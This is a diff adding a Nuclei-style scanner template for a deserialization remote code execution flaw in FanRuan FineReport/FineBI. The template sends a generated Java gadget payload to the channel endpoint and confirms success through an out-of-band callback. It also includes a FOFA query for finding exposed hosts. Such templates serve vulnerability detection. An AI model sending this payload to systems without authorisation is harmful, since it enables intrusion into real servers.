@@ -1,0 +1,29 @@
+id: fanruan-deserialization
+
+info:
+  name: Fanruan Deserialization - Remote Code Execution
+  author: Co5mos
+  severity: critical
+  description: The FineReport/FineBI channel interface can accept serialized data and deserialize it. Working in conjunction with the FanRuan built-in CB chain may lead to arbitrary code execution.
+  reference:
+    - https://blog.csdn.net/qq_51295677/article/details/131789320
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="帆软-FineReport"
+  tags: finereport,rce
+
+http:
+  - raw:
+      - |
+        POST /webroot/decision/remote/design/channel HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        {{generate_java_gadget("dns", "http://{{interactsh-url}}", "gzip")}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
